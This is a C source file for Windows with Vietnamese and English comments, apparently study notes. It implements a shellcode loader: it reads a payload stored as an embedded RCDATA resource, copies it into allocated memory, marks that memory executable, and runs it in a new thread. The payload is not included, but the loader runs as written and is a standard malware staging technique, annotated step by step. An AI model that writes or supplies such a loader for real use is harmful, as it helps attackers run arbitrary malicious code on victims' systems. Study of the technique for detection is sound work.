#include <windows.h>
#include <stdio.h>
#include <winnt.h>

#define SC_ICON11 2345

int main()
{
    // Những điểm khác biệt chính giữa hai hàm:

    // FindResourceA làm việc với chuỗi ANSI (1 byte mỗi ký tự) và được dùng trong ứng dụng ANSI.
    // FindResourceW làm việc với chuỗi Unicode/Wide (2 byte mỗi ký tự) và được dùng trong ứng dụng Unicode.

    // load rsrc
    HRSRC rsrc_handle = FindResourceW(NULL, MAKEINTRESOURCEW(SC_ICON11), MAKEINTRESOURCEW(RT_RCDATA)
                                      // [in, optional] HMODULE hModule,
                                      // [in]           LPCWSTR lpName,
                                      // [in]           LPCWSTR lpType
    );

    // load the shellcode payload
    // If the loaded resource is available, the return value is a pointer to the first byte of the resource; otherwise, it is NULL.
    HGLOBAL shellcode_hanlde = LoadResource(NULL, rsrc_handle);

    // get pointer for loaded shell code
    LPVOID pointerToLoaderShellcode = LockResource(
        shellcode_hanlde);

    // get the length of shellcode payload 
    // If the function succeeds, the return value is the number of bytes in the resource.
    // If the function fails, the return value is zero
    DWORD size_of_rsrc = SizeofResource(NULL, rsrc_handle

                                        // [in, optional] HMODULE hModule,
                                        // [in]           HRSRC   hResInfo
    );

    // shell code length

    // how can allocate virtual memmory in windows
    // this may be virtual alloc or virtual allocex

    LPVOID memoryAdress = VirtualAlloc(NULL, size_of_rsrc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // load shell code into memory
    // Copies the contents of a source memory block to a destination memory block,
    // and supports overlapping source and destination memory blocks.
    RtlMoveMemory(memoryAdress, pointerToLoaderShellcode, size_of_rsrc);

    // Changes the protection of LPVOID memoryAdress to PAGE_EXECUTE_READ
    // --> so this make shellcode in this memory executable
    // Changes the protection on a region of committed pages in the virtual
    // address space of the calling process.
    // To change the access protection of any process, use the VirtualProtectEx function.
    DWORD oldProtect = 0;
    BOOL isSucess = VirtualProtect(memoryAdress, size_of_rsrc, PAGE_EXECUTE_READ, &oldProtect
                                   // [in]  LPVOID lpAddress,
                                   // [in]  SIZE_T dwSize,
                                   // [in]  DWORD  flNewProtect,
                                   // [out] PDWORD lpflOldProtect
    );

    // create a thread to execute the shell code

    if (isSucess != NULL)
    {
        HANDLE thread1_handle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)memoryAdress, NULL, NULL, NULL

                                             // [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes, --- A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited.
                                             // [in]            SIZE_T                  dwStackSize,  --- he initial size of the stack, in bytes. The system rounds this value to the nearest page. If this parameter is zero, the new thread uses the default size for the executable. For more information, see Thread Stack Size.
                                             // [in]            LPTHREAD_START_ROUTINE  lpStartAddress, --- A pointer to the application-defined function to be executed by the thread. This pointer represents the starting address of the thread. For more information on the thread function, see ThreadProc.
                                             // [in, optional]  __drv_aliasesMem LPVOID lpParameter, -- A pointer to a variable to be passed to the thread.
                                             // [in]            DWORD                   dwCreationFlags,  -- The flags that control the creation of the thread.
                                             // [out, optional] LPDWORD                 lpThreadId -- A pointer to a variable that receives the thread identifier. If this parameter is NULL, the thread identifier is not returned.
        );

        // wait for thread complete
        // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject

        // If the function succeeds, the return value is a handle to the new thread.
        // If the function fails, the return value is NULL
        WaitForSingleObject(thread1_handle, INFINITE
                            // [in] HANDLE hHandle, --
                            // [in] DWORD  dwMilliseconds

        );
    }
    return 1;
}